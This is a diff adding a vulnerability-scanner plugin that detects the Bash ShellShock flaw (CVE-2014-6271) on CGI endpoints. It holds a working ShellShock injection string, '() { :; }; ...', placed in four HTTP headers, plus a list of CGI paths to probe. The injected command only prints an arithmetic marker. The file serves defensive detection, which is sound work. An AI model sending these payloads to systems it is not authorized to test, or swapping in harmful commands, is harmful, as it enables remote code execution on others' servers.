@@ -1,0 +1,103 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "CVE-2014-6271 - ShellShock Detector"
+  author: "Giacomo Coluccelli (giacomo@doyensec.com)"
+  version: "1.0"
+  description: "Detects GNU Bash ShellShock remote code execution (CVE-2014-6271) via CGI HTTP headers."
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE-2014-6271"
+  }
+  severity: CRITICAL
+  title: "CVE-2014-6271 - ShellShock"
+  description: "GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka \"ShellShock.\" NOTE: the original fix for this issue was incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is still present after the incorrect fix."
+  recommendation: "Update bash to a version >4.3"
+  related_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE-2014-7169"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "probe_shellshock_cgi_rce"
+  http_request: {
+    method: GET
+    uri: [
+      "/cgi-bin/status",
+      "/cgi-bin/stats",
+      "/cgi-bin/test",
+      "/cgi-bin/test.cgi",
+      "/cgi-bin/test.sh",
+      "/cgi-bin/test-cgi",
+      "/cgi-bin/printenv",
+      "/cgi-bin/status/status.cgi",
+      "/cgi-bin/index.cgi",
+      "/cgi-bin/login.cgi",
+      "/cgi-mod/index.cgi",
+      "/cgi-sys/defaultwebpage.cgi",
+      "/test.cgi",
+      "/debug.cgi",
+      "/"
+    ]
+    headers: [
+      {
+        name: "User-Agent"
+        value: "() { :; }; echo Content-Type: text/plain; echo; printf 'TSUNAMI_SHELLSHOCK_%s_END\\n' $(({{ factor_a }}*{{ factor_b }}))"
+      },
+      {
+        name: "Referer"
+        value: "() { :; }; echo Content-Type: text/plain; echo; printf 'TSUNAMI_SHELLSHOCK_%s_END\\n' $(({{ factor_a }}*{{ factor_b }}))"
+      },
+      {
+        name: "Cookie"
+        value: "() { :; }; echo Content-Type: text/plain; echo; printf 'TSUNAMI_SHELLSHOCK_%s_END\\n' $(({{ factor_a }}*{{ factor_b }}))"
+      },
+      {
+        name: "Accept-Language"
+        value: "() { :; }; echo Content-Type: text/plain; echo; printf 'TSUNAMI_SHELLSHOCK_%s_END\\n' $(({{ factor_a }}*{{ factor_b }}))"
+      }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "TSUNAMI_SHELLSHOCK_{{ expected_product }}_END" }
+        ]
+      }
+    }
+    client_options: {
+      disable_follow_redirects: true
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "factor_a" value: "31337" },
+    { name: "factor_b" value: "47123" },
+    { name: "expected_product" value: "1476693451" }
+  ]
+  actions: [
+    "probe_shellshock_cgi_rce"
+  ]
+}
